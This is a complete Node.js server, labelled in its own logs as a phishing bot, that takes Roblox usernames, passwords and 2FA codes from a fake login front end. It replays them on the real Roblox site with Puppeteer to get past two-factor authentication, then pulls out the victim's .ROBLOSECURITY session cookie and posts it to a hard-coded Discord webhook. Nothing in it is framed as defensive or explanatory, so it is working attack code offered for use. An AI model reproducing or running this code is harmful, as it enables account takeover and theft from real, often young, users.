const express = require('express');
const puppeteer = require('puppeteer');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1435798020288417865/gO1qdwE0APRlrKeM63Ocvpvg2aviGSktAOQfYWYCTYz_AMU0xEKfIkhp6CB1I4oYsTr8';

let browser, page, victimUsername;

app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    victimUsername = username;
    console.log(`[+] Received credentials for: ${username}`);
    try {
        browser = await puppeteer.launch({ headless: true });
        page = await browser.newPage();
        await page.goto('https://www.roblox.com/login', { waitUntil: 'networkidle2' });
        console.log('[+] Typing credentials into real Roblox site...');
        await page.type('#login-username', username);
        await page.type('#login-password', password);
        await page.click('#login-button');
        await page.waitForNavigation({ timeout: 7000 }).catch(() => {});
        if (page.url().includes('/login/2fa')) {
            console.log('[!] 2FA required. Informing front-end.');
            res.json({ status: '2FA_Required' });
        } else if (page.url().includes('/home')) {
             console.log('[+] Login successful WITHOUT 2FA!');
             await handleSuccessfulLogin(res);
        } else {
            console.log('[-] Login failed.');
            res.status(400).json({ status: 'Login_Failed' });
            if (browser) await browser.close();
        }
    } catch (error) {
        console.error('Bot Error:', error);
        res.status(500).json({ status: 'Bot_Error' });
        if (browser) await browser.close();
    }
});

app.post('/submit-tfa', async (req, res) => {
    const { tfaCode } = req.body;
    console.log(`[+] Received 2FA code: ${tfaCode}`);
    try {
        console.log('[+] Typing 2FA code...');
        await page.type('#two-step-verification-code-input', tfaCode);
        await page.click('#two-step-verification-verify-button');
        await page.waitForNavigation({ timeout: 10000 }).catch(() => {});
        if (page.url().includes('/home')) {
            console.log('[+] 2FA successful!');
            await handleSuccessfulLogin(res);
        } else {
            console.log('[-] 2FA failed.');
            res.status(400).json({ status: '2FA_Failed' });
            if (browser) await browser.close();
        }
    } catch (error) {
        console.error('Bot Error:', error);
        res.status(500).json({ status: 'Bot_Error' });
        if (browser) await browser.close();
    }
});

async function handleSuccessfulLogin(res) {
    console.log('[+] Extracting .ROBLOSECURITY cookie...');
    const cookies = await page.cookies();
    const robloSecurityCookie = cookies.find(c => c.name === '.ROBLOSECURITY');
    if (robloSecurityCookie) {
        console.log('[+] Cookie found! Sending to Discord...');
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: 'Roblox Loot Bot',
                content: `**SUCCESS!**\n**User:** ${victimUsername}\n**Cookie:** \`\`\`${robloSecurityCookie.value}\`\`\``
            })
        });
        res.json({ status: 'Success' });
    } else {
        res.status(500).json({ status: 'Cookie_Not_Found' });
    }
    if (browser) await browser.close();
}

app.listen(3000, () => {
    console.log('[+] Phishing bot is live on port 3000');
});
